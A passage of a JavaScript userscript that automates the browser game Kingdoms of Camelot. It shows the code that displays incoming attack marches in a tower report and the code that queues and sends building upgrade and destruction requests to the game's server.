            diplomacy = getDiplomacy(allianceId);
        }
        else
            if (m.players && m.players['u' + m.pid]) {
                who = m.players['u' + m.pid].n;
                attackermight = parseInt(m.players['u' + m.pid].m);
                allianceId = 'a' + m.players['u' + m.pid].a;
                allianceName = Seed.allianceNames[allianceId];
                diplomacy = getDiplomacy(allianceId);
            }
            else {
                who = 'n.A.';
                attackermight = 'n.A.';
                allianceId = 'n.A.';
                allianceName = 'n.A.';
                diplomacy = 'n.A.';
            }
        //SOURCE
        if (m.fromXCoord)
            var source = m.fromXCoord + ',' + m.fromYCoord;
        else
            var source = 'n.A.';
        
        var arrivingDatetime = new Date();
        arrivingDatetime.setTime(m.arrivalTime * 1000);
        var count = t.towerMarches.length + 1;
        t.towerMarches[count] = {
            added: now,
            cityId: m.toCityId,
            target: target,
            arrival: parseIntNan(m.arrivalTime),
            atkType: atkType,
            who: who,
            attackermight: attackermight,
            allianceName: allianceName,
            diplomacy: diplomacy,
            rtime: unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())),
            arrivingDatetime: arrivingDatetime,
            source:source,
            units: units,
        };
    },
    showTowerIncoming: function(cityId){
        var t = Tabs.tower;
        var popTowerIncoming = null;
        var cityName = Tabs.build.getCityNameById(cityId);
        
        if (t.popTowerIncoming == null) {
            t.popTowerIncoming = new pbPopup('pbtower_' + cityId, 0, 0, 820, 500, true, function() {clearTimeout (t.timer);});
        }
        t.popTowerIncoming.show(false);
        var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbTabPad" id="pbCityTowerContent">';
        t.popTowerIncoming.getMainDiv().innerHTML = '</table></div>' + m;
        t.popTowerIncoming.getTopDiv().innerHTML = '<TD width="200px"><B>'+translate("Tower Report of")+' ' + cityName + '</b></td></td>';
        t.addCityData2Pop(cityId);
        t.popTowerIncoming.show(true);
        clearTimeout (t.timer);
        t.timer = setTimeout (function() {t.showTowerIncoming(cityId)}, 5000);        
    },
    addCityData2Pop: function(cityId){
        var t = Tabs.tower;
        var rownum = 0;
        var names = ['Supply', 'Mil', 'Scout', 'Pike', 'Sword', 'Archer', 'Cav', 'Heavy', 'Wagon', 'Balli', 'Ram', 'Cat'];
        enc = {};
        numSlots = 0;
        var row = document.getElementById('pbCityTowerContent').innerHTML = "";
        if (matTypeof(Seed.queue_atkinc) != 'array') {
            for (k in Seed.queue_atkinc) {
                march = Seed.queue_atkinc[k];
                if (march.marchType == 2) {
                    ++numSlots;
                    city = march.toCityId;
                    from = march.fromPlayerId;
                    if (!enc[city])
                        enc[city] = {};
                    if (!enc[city][from])
                        enc[city][from] = [];
                    k = [];
                    k[0] = parseInt(march.knightCombat);
                    for (i = 1; i < 13; i++) {
                        if (Options.encRemaining)
                            k[i] = parseInt(march['unit' + i + 'Return']);
                        else
                            k[i] = parseInt(march['unit' + i + 'Count']);
                    }
                    k[14] = parseInt(march.marchStatus);
                    var now = unixTime();
                    k[15] = parseInt(march.destinationUnixTime) - now;
                    enc[city][from].push(k);
                }
            }
        }
        var s1 = '';
        var s2 = '';
        var s3 = '';
        var tot = [];
        var atk = [];
        for (i = 0; i < 13; i++) {
            tot[i] = 0;
            atk[i] = 0;
        }

            s1 += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;} .attack{background:#FF9999;} .own{background:#66FF66;}</style>';
            s1 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=center width=16%></td>';
            
            for (k = 0; k < names.length; k++)
                s1 += '<TD width=7%><B>' + names[k] + '</b></td>';
            s1 += '</tr>';
            dest = cityId;
            if (enc[dest]) {
                for (p in enc[dest]) {
                    try {
                        player = Seed.players['u' + p].n;
                    }
                    catch (err) {
                        player = '???';
                    }
                    for (m = 0; m < enc[dest][p].length; m++) {
                        /*knight = '';
                        if (enc[dest][p][m][0] > 0)
                            knight = ' (' + enc[dest][p][m][0] + ')';
                        */
                        status = '';
                        if (enc[dest][p][m][14] == 1) {
                            status = ' (' + timestr(enc[dest][p][m][15]) + ')';    
                            if (enc[dest][p][m][15] < 0)
                                status = ' (enc)';    
                            else
                                 status = ' (' + timestr(enc[dest][p][m][15]) + ')';    
                        }
                        if (enc[dest][p][m][14] == 2) {
                            status = ' (enc)';    
                        }

                        s1 += '<TR align=right><TD align=left class="city">' + player + status +'</td>'
                        for (i = 1; i < 13; i++) {
                            num = enc[dest][p][m][i];
                            s1 += '<TD class="city">' + num + '</td>';
                            tot[i] += num;
                        }
                        //s1 += '<TD><INPUT id=sendhome_' + numSlots + ' type=submit value="Home" style="border:1px solid black; background-color:red;"></td></tr>';
                    }
                }
            } else {
                s1 += '<TR align=right><TD align=left class="city"><B>'+translate("Reinforcment")+':</b></td>'
                for (i = 1; i < 13; i++) {
                    s1 += '<TD class="city">0</td>';
                }
                
            }
            s1 += '<TR align=right><TD colspan=14><BR></tr>';
            s1 += '<TR align=right><TD class="own" align=left><B>'+translate("Own Troops")+':</b></td>';
            //OWNTROOPS
            var ownTroops = "";
            for (r = 1; r < 13; r++) {
                cityString = 'city' + cityId;
                num = parseInt(Seed.units[cityString]['unt' + r]);
                s1 += '<TD class="own">' + num + '</td>';
                tot[r] += num;
            }
            s1 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>'+translate("Defenders")+':</b></td>';
            for (i = 1; i < 13; i++)
                s1 += '<TD class="tot">' + tot[i] + '</td>';      
            s3 += '</tr></table>';
        
        s3 += '<TD class="city"></td><TR><TD colspan=14><BR></td></tr><TR align=right><TD class="tot" align=left><B>'+translate("Incoming Attacks")+':</b></td>';
        
        var names = ['Supply', 'Mil', 'Scout', 'Pike', 'Sword', 'Archer', 'Cav', 'Heavy', 'Wagon', 'Balli', 'Ram', 'Cat'];
        if (t.towerMarches.length > 0) {
            for (k in t.towerMarches) {
                if (typeof t.towerMarches[k].atkType != 'undefined') {
                    if (t.towerMarches[k].cityId == cityId) {
                        s3 += '<TABLE cellspacing=0 width=100%><TR>';
                        
                        if (t.towerMarches[k].atkType == 'attacked') {
                            s3 += '<TD rowspan=2 width=5%><B><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_30.jpg?6545"></b></td>';
                        }
                        else
                            if (t.towerMarches[k].atkType == 'scouted') {
                                s3 += '<TD rowspan=2 width=5%><B><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_30.jpg?6545"></b></td>';
                            }
                        s3 += '<TD width=15%><B>'+translate("Location")+'</b></td>';
                        s3 += '<TD width=15%><B>'+translate("Name")+'</b></td>';
                        s3 += '<TD width=10%><B>'+translate("Source")+': </b></td><TD width=10%>' + t.towerMarches[k].source + '</td>';
                        s3 += '<TD width=10%><B>'+translate("Might")+': </b></td><TD width=10%>' + t.towerMarches[k].attackermight + '</td>';
                        s3 += '<TD width=10%><B>'+translate("Alliance")+': </b></td><TD width=10%>' + t.towerMarches[k].allianceName + '</td>';
                        s3 += '<TD width=10%><B>'+translate("State")+': </b></td><TD width=10%>' + t.towerMarches[k].diplomacy + '</td></tr>';
                        s3 += '<TR><TD width=10%  >' + t.towerMarches[k].target + '</td>';
                        s3 += '<TD  >' + t.towerMarches[k].who + '</td>';
                        s3 += '<TD><B>'+translate("Remaining")+': </b></td><TD width=10%>' + t.towerMarches[k].rtime + '</td>';
                        s3 += '<TD><B>'+translate("Arrival")+': </b></td><TD  colspan=5 width=10%>' + t.towerMarches[k].arrivingDatetime + '</td></tr>';
                        s3 += '</tr></table>';
                        s3 += '<TABLE cellspacing=0 width=100%><TR align=right><TD align=left width=16%></td>';
                        for (n = 0; n < names.length; n++)
                            s3 += '<TD width=7%><B>' + names[n] + '</b></td>';
                        s3 += '</tr><TR align=right><TD class="attack" align=left><B>Units:</td>';
                        for (u = 1; u < 13; u++) {
                            num = t.towerMarches[k].units[u];
                            s3 += '<TD class="attack">' + num + '</td>';
                            atk[u] += parseInt(num);
                        }
                        s3 += '</tr></table>';
                    }
                }
                
            }
        }
        s2 += '<TR><TD colspan=14><BR></td></tr><TR align=right><TD class="attack" align=left><B>'+translate("Attackers")+':</b></td>';
        for (a = 1; a < 13; a++)
            s2 += '<TD class="attack" width=7%>' + atk[a] + '</td>';
        var html = s1 + s2 + s3;
        document.getElementById('pbCityTowerContent').innerHTML = html;

    },
    sendReinforcmentHome: function(){ //FUNCTION NOT IN USE YET BUT SOON :-)
        //mid, cid, fromUid, fromCid, upkeep
        var params = Object.clone(g_ajaxparams);
        params.mid = mid;
        params.cid = cid;
        params.fromUid = fromUid;
        params.fromCid = fromCid;
        new Ajax.Request(g_ajaxpath + "ajax/kickoutReinforcements.php" + g_ajaxsuffix, {
            method: "post",
            parameters: params,
            onSuccess: function(transport){
                var rslt = eval("(" + transport.responseText + ")");
                if (rslt.ok) {
                    Modal.showAlert(g_js_strings.kickout_allies.troopshome);
                    seed.resources["city" + currentcityid].rec1[3] = parseInt(seed.resources["city" + currentcityid].rec1[3]) - upkeep;
                    if (parseInt(fromUid) == parseInt(tvuid)) {
                        var curmarch = seed.queue_atkp["city" + fromCid]["m" + mid];
                        var marchtime = Math.abs(parseInt(curmarch.destinationUnixTime) - parseInt(curmarch.eventUnixTime));
                        curmarch.returnUnixTime = unixTime() + marchtime;
                        curmarch.marchStatus = 8
                    }
                    delete seed.queue_atkinc["m" + mid]
                }
                else {
                    Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
                }
            },
            onFailure: function(){
            }
        })
    },
}


/****************************  Build Implementation  ******************************
 TODO:
     visu directly in the game of build queue elements
     <span class="leveltag" style="left:60px;">10</span>
     more todos within the code
 */
var quickAddBuildings = {
	all:"Tous",
	barracks:"Casernes",
	cottages:"Maison",
}
var buildTabTypes = {
type1: "Ferme",
     type2: "Scierie",
     type3: "Carrière",
     type4: "Mine",
     type5: "Maison",
     Type7: "Salle Chevalier",
     TYPE8: "Ambassade",
     type11: "Laboratoire",
     type12: "Point de Ralliement",
     type13: "Caserne",
     type15: "Forgeron",
     Type16: "WorkShop",
     type17: "Ecurie",
     type18: "Station de Secours",
     type19: "Rempart",
     type20: "FeySpire",
     type21: "Apothicaire",
     type0: "Chateaux"
};
Tabs.build = {
    tabOrder: 20,
    tabLabel: 'Construction',
    myDiv: null,
    timer: null,
    buildTab: null,
    koc_buildslot: null,
    currentBuildMode: null,
    buildStates: [],
    loaded_bQ: [],
    lbQ: [],
    toolsMode: null,
    buildingSelect:'all',

    init: function (div) {
        var t = Tabs.build;
        t.myDiv = div;
        t.koc_buildslot = unsafeWindow.buildslot; //save original koc function
        t.currentBuildMode = "build";
        t.buildStates = {
            running: false,
            help: false,
        };
        t.readBuildStates();
        for (var i = 0; i < Cities.cities.length; i++) {
            t["bQ_" + Cities.cities[i].id] = JSON2.parse(GM_getValue('bQ_' + getServerId() + '_' + Cities.cities[i].id, '[]'));
            if (typeof t["bQ_" + Cities.cities[i].id] == 'undefined' || (t["bQ_" + Cities.cities[i].id]) == "") {
                t["bQ_" + Cities.cities[i].id] = [];
            }
        }
        var m = '<DIV id=pbBuildDivF class=pbStat>' + translate("Mode Construction") + '</div><TABLE id=pbbuildfunctions width=100% height=0% class=pbTab><TR>';
        if (t.buildStates.running == false) {
            m += '<TD><INPUT id=pbBuildRunning type=submit value="' + translate("Construction AUTO = OFF") + '"></td>';
        } else {
            m += '<TD><INPUT id=pbBuildRunning type=submit value="' + translate("Construction AUTO = ON") + '"></td>';
        }
        m += '<TD><INPUT id=pbBuildMode type=submit value="' + translate("Choisir Construction = OFF") + '"></td>';
        m += '<TD>' + translate("Mode") + ': <SELECT id="pbBuildType">\
				<OPTION value=build>' + translate("Augmentée Niveau") + '</option>\
				<OPTION value=max>' + translate("Niveau Maximum") + '</option>\
				<OPTION value=destruct>' + translate("Detruire") + '</option>\
				</select></td>';
        m += '<TD><INPUT id=pbHelpRequest type=checkbox ' + (t.buildStates.help ? ' CHECKED' : '') + '\></td><TD>' + translate("Ask for help") + '?</td></table>';
        m += '<DIV id=pbBuildDivF class=pbStat>' + translate("Choix") + '</div>'
        m += '<TABLE id=pbbuildtools width=100% height=0% class=pbTab><TR>';
        m += '<DIV id=cityBuild></div>';



        m += '<TD>Choix<SELECT id=whichBuilding>';
        	for (k in quickAddBuildings){
        		m += '<OPTION value='+k+'>'+quickAddBuildings[k]+'</option>';
        	}
        m += '</select>';

        m += ' Niveaux &nbsp;<SELECT id=addAllTo>'
        for (a = 2; a <= 9; a++) {
            m += '<OPTION value=toLvl' + a + '>' + a + '</option>';
        }
        m += '</select>';
        m += '<INPUT id=doXbuildingToX type=submit value=ADD></td>';



        m += '</table>';
        m += '<DIV id=pbBuildDivQ class=pbStat>' + translate("Construction en cours") + '</div><TABLE id=pbbuildqueues width=100% height=0% class=pbentry><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><B>' + Cities.cities[i].name + '</b></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><INPUT id=pbbuild_' + Cities.cities[i].id + ' type=submit value="' + translate("Aperçu") + '"></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><INPUT id=pbCancelAll_' + Cities.cities[i].id + ' type=submit value="' + translate("Annulé Tout") + '"></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><DIV id=divBuildingCity_' + Cities.cities[i].id + '></div></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><DIV id=divCurrentBuildCity_' + Cities.cities[i].id + '></div></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD colspan=2><CENTER><DIV id=divTimeLeftCity_' + Cities.cities[i].id + '></div></center></td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            m += '<TD>Qc:</td><TD id=pbbuildcount_' + Cities.cities[i].id + '>' + t["bQ_" + Cities.cities[i].id].length + '</td>';
        }
        m += '</tr><TR>';
        for (var i = 0; i < Cities.cities.length; i++) {
            t['totalTime_' + Cities.cities[i].id] = 0;
            cbQ = t["bQ_" + Cities.cities[i].id];
            if (typeof cbQ != 'undefined') {
                for (var j = 0; j < cbQ.length; j++) {
                    t['totalTime_' + Cities.cities[i].id] = parseInt(t['totalTime_' + Cities.cities[i].id]) + parseInt(cbQ[j].buildingTime);
                }
                timestring = timestr(t['totalTime_' + Cities.cities[i].id]);
            }
            m += '<TD>Tt:</td><TD id=pbbuildtotal_' + Cities.cities[i].id + '>' + timestring + '</td>';
        }
        m += '</tr></table><SPAN class=boldRed id=pbbuildError></span>';
        t.myDiv.innerHTML = m;
        new CdispCityPicker ('cityBuildpicker', document.getElementById('cityBuild'), true, t.ClickCitySelect, 0);
        setInterval(t.paintBusyDivs, 1 * 1000)
        for (var i = 0; i < Cities.cities.length; i++) {
            var cityId = Cities.cities[i].id;
            var btnName = 'pbbuild_' + cityId;
            addQueueEventListener(cityId, btnName);
            var btn2Name = 'pbCancelAll_' + cityId;
            CancelAllEventListener(cityId, btn2Name);
            t.showBuildQueue(cityId, false);
        }
        t.e_autoBuild(); //start checking if we can build someting
        document.getElementById('pbBuildType').addEventListener('change', function () {
            t.setBuildMode(this.value);
        }, false);
        document.getElementById('pbBuildRunning').addEventListener('click', function () {
            t.toggleStateRunning(this);
        }, false);
        document.getElementById('pbBuildMode').addEventListener('click', function () {
            t.toggleStateMode(this);
        }, false);
        document.getElementById('pbHelpRequest').addEventListener('change', function () {
            t.buildStates.help = (document.getElementById('pbHelpRequest').checked);
            t.saveBuildStates();
        }, false);
        document.getElementById('whichBuilding').addEventListener('change',function(){
        	t.buildingSelect = document.getElementById('whichBuilding').value
        });
        document.getElementById('doXbuildingToX').addEventListener('click', function () {
        	toLevel = document.getElementById('addAllTo').value.substr(5);
            if (t.buildingSelect == 'all'){
            	t.allBuildsTo(toLevel);
            }
            if (t.buildingSelect == 'barracks'){
            	t.allBarracksTo(toLevel);
            }
            if (t.buildingSelect == 'cottages'){
            	t.allCotsTo(toLevel);
            }
            toLevel = null;
        });
        window.addEventListener('unload', t.onUnload, false);

        function addQueueEventListener(cityId, name) {
            document.getElementById(name).addEventListener('click', function () {
                t.showBuildQueue(cityId, true);
            }, false);
        }

        function CancelAllEventListener(cityId, name) {
            document.getElementById(name).addEventListener('click', function () {
                t["bQ_" + cityId] = [];
                t['totalTime_' + cityId] = 0;
                document.getElementById('pbbuildcount_' + cityId).innerHTML = 0;
                document.getElementById('pbbuildtotal_' + cityId).innerHTML = timestr(0);
            }, false);
        }


    },
    ClickCitySelect:function(city){
    	//logit(city.toSource());
    	var t = Tabs.build;
		t.currentCity = city.id
	},
    allBuildsTo: function (toLevel) {
        var t = Tabs.build;
        var cityId = t.currentCity
        var builds = Seed.buildings
        //alert('1'+cityId)

            for (pos in builds['city'+cityId]) {
            	//alert('2'+builds['city'+cityId])
                if (builds['city'+cityId][pos] != undefined && builds['city'+cityId][pos][1] != 0) {
                    var item = builds['city'+cityId][pos]
                //logit(builds['city'+cityId][pos])
                    if (item[1] < 9) {
                        //var cityId = city.substr(4);
                        var buildingType = item[0];
                        var currentLevel = item[1];
                        var position = item[2];
                        if (item[3] != undefined) {
                            var buildingId = item[3];
                        } else {
                            var buildingId = "unknown";
                        }
                        t.doExtraTools(cityId, position, buildingId, buildingType, currentLevel,toLevel) //
                        //logit(city.substr(4) + ' ' + builds[city][pos][0] + ' ' + builds[city][pos][1] + ' ' + builds[city][pos][2] + ' ' + builds[city][pos][3]);
                    }
                }
            }
    },
    allCotsTo: function (toLevel) {
        var t = Tabs.build;
        var cityId = t.currentCity
        var builds = Seed.buildings
        for (pos in builds['city'+cityId]) {
            if (builds['city'+cityId][pos] != undefined && builds['city'+cityId][pos][0] == 5 && builds['city'+cityId][pos][1] != 0) {
                var item = builds['city'+cityId][pos]
                if (item[1] < 9) {
                    var buildingType = item[0];
                    var currentLevel = item[1];
                    var position = item[2];
                    if (item[3] != undefined) {
                        var buildingId = item[3];
                    } else {
                        var buildingId = "unknown";
                    }
                    t.doExtraTools(cityId, position, buildingId, buildingType, currentLevel,toLevel) //
                        //logit(city.substr(4) + ' ' + builds[city][pos][0] + ' ' + builds[city][pos][1] + ' ' + builds[city][pos][2] + ' ' + builds[city][pos][3]);
                }
            }
        }
    },
    allBarracksTo: function (toLevel) {
        var t = Tabs.build;
        var cityId = t.currentCity
        var builds = Seed.buildings
        for (pos in builds['city'+cityId]) {
            if (builds['city'+cityId][pos] != undefined && builds['city'+cityId][pos][0] == 13 && builds['city'+cityId][pos][1] != 0) {
                var item = builds['city'+cityId][pos]
                if (item[1] < 9) {
                    var buildingType = item[0];
                    var currentLevel = item[1];
                    var position = item[2];
                    if (item[3] != undefined) {
                        var buildingId = item[3];
                    } else {
                        var buildingId = "unknown";
                    }
                    t.doExtraTools(cityId, position, buildingId, buildingType, currentLevel,toLevel) //
                        //logit(city.substr(4) + ' ' + builds[city][pos][0] + ' ' + builds[city][pos][1] + ' ' + builds[city][pos][2] + ' ' + builds[city][pos][3]);
                }
            }
        }
    },
    setBuildMode: function (type) {
        var t = Tabs.build;
        t.currentBuildMode = type;
    },
    doExtraTools: function (cityId, pos, buildingId, buildingType, currentLevel,toLevel) { //
        //logit(cityId+ ' ' +pos + ' ' + buildingId);	//, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode
        var startLevel = currentLevel
        var t = Tabs.build;
        for (k = startLevel; k < toLevel; k++) {
            var buildingMode = "build";
            var cityId = parseInt(cityId);
            var buildingPos = parseInt(pos);
            var buildingType = parseInt(buildingType);
            var buildingLevel = parseInt(currentLevel);
            var buildingAttempts = parseInt(0);
            var result = t.calculateQueueValues(cityId, buildingLevel, buildingType, buildingMode);
            var buildingMult = result[0];
            var buildingTime = result[1];
            var buildingId = parseInt(buildingId);
            t.addQueueItem(cityId, buildingPos, buildingType, buildingId, buildingTime, buildingLevel, buildingAttempts, buildingMult, buildingMode);
            currentLevel++
        }

    },
    e_autoBuild: function () {
        var t = Tabs.build;
		var buildInterval = 2 * 1000; // 2 seconds between checks by default
        document.getElementById('pbbuildError').innerHTML = '';
		
        if (t.buildStates.running == true) {
            var now = unixTime();
            //logit ('Seed.queue_con: (now='+ now +')\n'+ inspect (Seed.queue_con, 3));
            for (var i = 0; i < Cities.cities.length; i++) {
                var cityId = Cities.cities[i].id;
                var isBusy = false;
                var qcon = Seed.queue_con["city" + cityId];
                if (matTypeof(qcon) == 'array' && qcon.length > 0) {
                    if (parseInt(qcon[0][4]) > now) isBusy = true;
                    else qcon.shift(); // remove expired build from queue        
                }
                //logit ('City #'+ (i+1) + ' : busy='+ isBusy);               
                if (isBusy) {
                    //TODO add info of remaining build time and queue infos
                } else {
                    if (t["bQ_" + cityId].length > 0) { // something to do?
                        var bQi = t["bQ_" + cityId][0]; //take first queue item to build

                        t.doOne(bQi);
						buildInterval = 10 * 1000; // we tried to build so use longer interval
                        //setTimeout(t.e_autoBuild, 10000); //should be at least 10
                        //return; // we need to make sure that there is enough time for each ajax request to not overwrite the vaule that are needed by the next run
                    }
                }
            }
        }
        setTimeout(t.e_autoBuild, buildInterval); //should be at least 10
    },
    paintBusyDivs: function () {
        var t = Tabs.build;
        var now = unixTime();
        for (var i = 0; i < Cities.cities.length; i++) {
            var cityId = Cities.cities[i].id;
            var isBusy = false;
            var qcon = Seed.queue_con["city" + cityId];
            if (matTypeof(qcon) == 'array' && qcon.length > 0) {
                if (parseInt(qcon[0][4]) > now) {
                    isBusy = true;
                }
            }
            if (isBusy) {
                var timeLeft = Seed.queue_con["city" + cityId][0][4] - now
                if (Seed.queue_con["city" + cityId][0][1] == 0) {
                    document.getElementById('divBuildingCity_' + cityId).innerHTML = 'Destruction...';
                } else {
                    document.getElementById('divBuildingCity_' + cityId).innerHTML = 'Construction...';
                }
                document.getElementById('divCurrentBuildCity_' + cityId).innerHTML = buildTabTypes['type' + Seed.queue_con["city" + cityId][0][0]] + ' Lvl ' + Seed.queue_con["city" + cityId][0][1];
                document.getElementById('divTimeLeftCity_' + cityId).innerHTML = timestr(timeLeft);
            } else {
                document.getElementById('divBuildingCity_' + cityId).innerHTML = '';
                document.getElementById('divCurrentBuildCity_' + cityId).innerHTML = '';
                document.getElementById('divTimeLeftCity_' + cityId).innerHTML = '';
            }
        }
    },
    doOne: function (bQi) {
        var t = Tabs.build;
        var currentcityid = parseInt(bQi.cityId);
        var cityName = t.getCityNameById(currentcityid);
        var time = parseInt(bQi.buildingTime);
        var mult = parseInt(bQi.buildingMult);
        var attempt = parseInt(bQi.buildingAttempt);
        var bypasscheck = false;
        //mat/KOC Power Bot: 49 @ 19:41:45.274: Pos: 6 Type: 13 Level: 8 Id: 1523749
        var mode = bQi.buildingMode;
        //  var mode = "build"; //FOR DEBUG
        var citpos = parseInt(bQi.buildingPos);
        //  var citpos = 6; //FOR DEBUG
        if ((Seed.buildings['city' + currentcityid]["pos" + citpos] == undefined)) bypasscheck = true;
        if (!bypasscheck) {
            var l_bdgid = parseInt(bQi.buildingType); //JUST FOR CHECK
            var bdgid = parseInt(Seed.buildings['city' + currentcityid]["pos" + citpos][0]);
            //  var bdgid = 13; //FOR DEBUG
            var l_curlvl = parseInt(bQi.buildingLevel); //JUST FOR CHECK
            var curlvl = parseIntNan(Seed.buildings['city' + currentcityid]["pos" + citpos][1]);
            //  var curlvl = 8; //FOR DEBUG
            var l_bid = parseInt(bQi.buildingId); //JUST FOR CHECK
            var bid = parseInt(Seed.buildings["city" + currentcityid]["pos" + citpos][3]);
            //  var bid = 1523749; //FOR DEBUG
            if (curlvl > 8 && mode == 'build') {
                t.cancelQueueElement(0, currentcityid, time, false);
                actionLog(translate("Queue item deleted: Building level equals 9 or higher!!!"));
                return;
            };
            if (isNaN(curlvl)) {
                t.cancelQueueElement(0, currentcityid, time, false);
                actionLog(translate("Found no correct value for current building!!!!"));
                return;
            }
            if (l_bdgid != bdgid) {
                t.cancelQueueElement(0, currentcityid, time, false);
                actionLog(translate("Building Type does not match!!!!"));
                return;
            }
            if (l_bid != bid) {
                t.cancelQueueElement(0, currentcityid, time, false);
                actionLog(translate("Building ID does not match!!!!"));
                return;
            }
            if (l_curlvl < curlvl) {
                t.cancelQueueElement(0, currentcityid, time, false);
                actionLog(translate("Queue item deleted: Building level is equal or higher!!!"));
                return;
            }
            if (l_curlvl > curlvl && mode == 'build') {
                t.requeueQueueElement(bQi);
                return;
            }
        } else {
            var l_bdgid = parseInt(bQi.buildingType); //JUST FOR CHECK
            var bdgid = l_bdgid;
            //  var bdgid = 13; //FOR DEBUG
            var l_curlvl = parseInt(bQi.buildingLevel); //JUST FOR CHECK
            var curlvl = l_curlvl;
            //  var curlvl = 8; //FOR DEBUG
            var l_bid = parseInt(bQi.buildingId); //JUST FOR CHECK
            var bid = l_bid;
        }
        if (mode == 'destruct') {
            var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
            params.cid = currentcityid;
            params.bid = "";
            params.pos = citpos;
            params.lv = curlvl - 1;
            if (curlvl >= 1) {
                params.bid = bid;
            }
            params.type = bdgid;
            new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/destruct.php" + unsafeWindow.g_ajaxsuffix, {
                method: "post",
                parameters: params,
                onSuccess: function (rslt) {
                 if (rslt.updateSeed)
					unsafeWindow.update_seed(rslt.updateSeed);
                    if (rslt.ok) {
                        actionLog("Destructing " + unsafeWindow.buildingcost['bdg' + bdgid][0] + " at " + cityName);
                        Seed.queue_con["city" + currentcityid].push([bdgid, 0, parseInt(rslt.buildingId), unsafeWindow.unixtime(), unsafeWindow.unixtime() + time, 0, time, citpos]);
                        if (params.cid == unsafeWindow.currentcityid) unsafeWindow.update_bdg();
                        t.cancelQueueElement(0, currentcityid, time, false);
                    } else {
                        var errmsg = unsafeWindow.printLocalError(rslt.error_code || null, rslt.msg || null, rslt.feedback || null);
                        t.requeueQueueElement(bQi);
                        document.getElementById('pbbuildError').innerHTML = errmsg;
                        logit(errmsg);
                    }
                },
                onFailure: function () {
                    document.getElementById('pbbuildError').innerHTML = translate("Connection Error while destructing! Please try later again");
                }
            })
        }
        if (mode == 'build') {
            var invalid = false;
            var chk = unsafeWindow.checkreq("bdg", bdgid, curlvl); //check if all requirements are met
            for (var c = 0; c < chk[3].length; c++) {
                if (chk[3][c] == 0) {
                    invalid = true;
                }
            }
            if (invalid == false) {
                var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
                params.cid = currentcityid;
                params.bid = "";
                params.pos = citpos;
                params.lv = curlvl + 1;
                if (params.lv > 9) { //make sure that no level 10+ is built
                    t.cancelQueueElement(0, currentcityid, time, false);
                    actionLog(translate("Queue item deleted: Tryed to build level 10+ building! Please report if this happens!!!"));
                    return;
                }
                if (params.lv > 1) {
                    params.bid = bid;
                }
                params.type = bdgid;
                new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/construct.php" + unsafeWindow.g_ajaxsuffix, {
                    method: "post",
                    parameters: params,
                    onSuccess: function (rslt) {
                 if (rslt.updateSeed)
					unsafeWindow.update_seed(rslt.updateSeed);
                        if (rslt.ok) {
                            actionLog(translate("Building") + " " + unsafeWindow.buildingcost['bdg' + bdgid][0] + " Level " + params.lv + " at " + cityName);
                            Seed.resources["city" + currentcityid].rec1[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][1]) * mult * 3600;
                            Seed.resources["city" + currentcityid].rec2[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][2]) * mult * 3600;
                            Seed.resources["city" + currentcityid].rec3[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][3]) * mult * 3600;
                            Seed.resources["city" + currentcityid].rec4[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][4]) * mult * 3600;
                            Seed.citystats["city" + currentcityid].gold[0] -= parseInt(unsafeWindow.buildingcost["bdg" + bdgid][5]) * mult;
                            Seed.queue_con["city" + currentcityid].push([bdgid, curlvl + 1, parseInt(rslt.buildingId), unsafeWindow.unixtime(), unsafeWindow.unixtime() + time, 0, time, citpos]);
                            unsafeWindow.Modal.hideModalAll();
                            unsafeWindow.queue_changetab_building();
                            unsafeWindow.modal_build_show_state();
                            if (params.cid == unsafeWindow.currentcityid) unsafeWindow.update_bdg();
                            if (document.getElementById('pbHelpRequest').checked == true && time > 59) t.bot_gethelp(params.bid, currentcityid, time, 1);
                            t.cancelQueueElement(0, currentcityid, time, false);
                        } else {
                            var errmsg = unsafeWindow.printLocalError(rslt.error_code || null, rslt.msg || null, rslt.feedback || null);
                            if (rslt.error_code == 103) { // building has already the target level => just  delete
                                t.cancelQueueElement(0, currentcityid, time, false);
                                actionLog(translate("Queue item deleted: Building at this Level already exists or build process already started!"));
                            } else {
                                t.requeueQueueElement(bQi);
                                document.getElementById('pbbuildError').innerHTML = Cities.byID[currentcityid].name + ': ' + errmsg + translate(" Item was requeued. Check for retry count.");
                            }
                            logit(errmsg);
                        }
                    },
                    onFailure: function () {
                        document.getElementById('pbbuildError').innerHTML = translate("Connection Error while building! Please try later again");
                    }
                });
            } else {
                t.requeueQueueElement(bQi); // requeue item if check is invalid
            }
        }
        // } else {
        // t.cancelQueueElement(0, currentcityid, time, false);
        // actionLog(translate("Queue item deleted: Building does not exist!!!"));
        // }
    },
    requeueQueueElement: function (bQi) {
        var t = Tabs.build;
        var cityId = bQi.cityId;
        var buildingPos = parseInt(bQi.buildingPos);
